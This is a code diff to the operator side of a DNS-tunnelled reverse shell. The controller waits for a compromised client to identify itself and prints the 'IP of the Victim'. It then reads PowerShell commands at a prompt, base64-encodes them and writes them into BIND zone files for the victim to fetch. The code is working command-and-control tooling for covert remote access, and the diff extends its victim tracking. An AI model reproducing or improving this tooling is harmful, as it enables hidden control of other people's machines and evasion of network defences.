@@ -33,7 +33,7 @@ data = {}
 domain = "dnshell.programm.zip"
 
 
-def getData(code, counter, returndata=False):
+def getData(code, counter, returndata=False, returnDataAndIp=False):
     waitingfordata = True
     # Loop through the output of tail
     while waitingfordata:
@@ -74,9 +74,11 @@ def getData(code, counter, returndata=False):
                         #print(f"Base64: {datastring}")
                         # decode base64
                         decoded = base64_decode_string(datastring)
-                        print(decoded)
+                        if(returnDataAndIp):
+                            return decoded, query["ip_address"]
                         if(returndata):
                             return decoded
+                        print(decoded)
                         waitingfordata = False
 
                     #else:
@@ -90,7 +92,9 @@ def getData(code, counter, returndata=False):
 
 # Get Code from Client
 print("Waiting for client to connect... and identify itself")
-code = getData(0, 0, True)
+code, current_ip = getData(0, 0, True, True)
+print(f"ID for this Reverse Shell: {code}")
+print(f"IP of the Victim: {current_ip}")
 
 filename = f"../bind/data/zones/revshell.{domain}.zone"
 preset = f"../bind/data/zones/revshell.{domain}.preset"
@@ -98,8 +102,7 @@ preset = f"../bind/data/zones/revshell.{domain}.preset"
 command = ""
 counter = 0
 while(command != "exit"):
-    print("PS>")
-    command = base64_encode_string(input())
+    command = base64_encode_string(input("PS> "))
 
     # send command to client
     zone = open(filename, "a")
